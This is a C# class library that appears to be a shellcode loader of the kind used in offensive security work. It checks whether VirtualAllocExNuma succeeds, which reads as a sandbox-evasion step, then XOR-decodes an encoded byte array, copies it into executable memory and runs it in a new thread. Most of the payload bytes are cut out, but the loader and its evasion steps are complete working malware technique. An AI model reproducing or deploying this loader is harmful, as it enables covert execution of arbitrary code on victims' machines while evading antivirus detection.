using System;
using System.Collections.Generic;
using System.Linq;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading.Tasks;

namespace ClassLibrary1
{
    public class Class1
    {
        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
        static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);

        [DllImport("kernel32.dll")]
        static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);

        [DllImport("kernel32.dll")]
        static extern UInt32 WaitForSingleObject(IntPtr hHandle, UInt32 dwMilliseconds);

        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
        static extern IntPtr VirtualAllocExNuma(IntPtr hProcess, IntPtr lpAddress, uint dwSize, UInt32 flAllocationType, UInt32 flProtect, UInt32 nndPreferred);

        [DllImport("kernel32.dll")]
        static extern IntPtr GetCurrentProcess();

        [DllImport("kernel32.dll")]
        static extern void Sleep(uint dwMilliseconds);

        public static void AwesomeFunctionName()
        {
            IntPtr mem = VirtualAllocExNuma(GetCurrentProcess(), IntPtr.Zero, 0x1000, 0x3000, 0x4, 0);
            if (mem == null)
            {
                return;
            }

            byte[] buf = new byte[968]
                {
                    0x41, 0x8d, 0xf1, 0xf9, 0xf5, 0x1a, 0x34, 0x56, 0x04, 
                    0xdf, 0x57, 0xfd, 0xf3, 0xf9, 0xf4, 0x20, 0xac, 0x9a, 
                    0xad, 0xe2, 0x55, 0x6d, 0xe2, 0x55, 0x6c, 0xcc, 0x2b, 
                    0x95, 0xa9, 0x5b, 0xde, 0xad, 0x2a, 0x94, 0x34, 0xdf, 
                    ...
                    ...
                    ... 
                    0x6c, 0x4d, 0x28, 0x18, 0xff, 0x76, 0x7b, 0x5e, 0xf4, 
                    0xe8, 0x14, 0xcd, 0xac, 0x3b, 0xa8, 0xfb, 0x55, 0xb8, 
                    0x98, 0x0b, 0x53, 0x83, 0x5c, 0xa9, 0x5b
                };

            for (int i = 0; i < buf.Length; i++)
            {
                buf[i] = (byte)(((uint)buf[i] ^ 0xAA) & 0xFF);
            }

            int size = buf.Length;

            IntPtr addr = VirtualAlloc(IntPtr.Zero, 0x1000, 0x3000, 0x40);

            Marshal.Copy(buf, 0, addr, size);

            IntPtr hThread = CreateThread(IntPtr.Zero, 0, addr, IntPtr.Zero, 0, IntPtr.Zero);

            WaitForSingleObject(hThread, 0xFFFFFFFF);
        }
    }
}
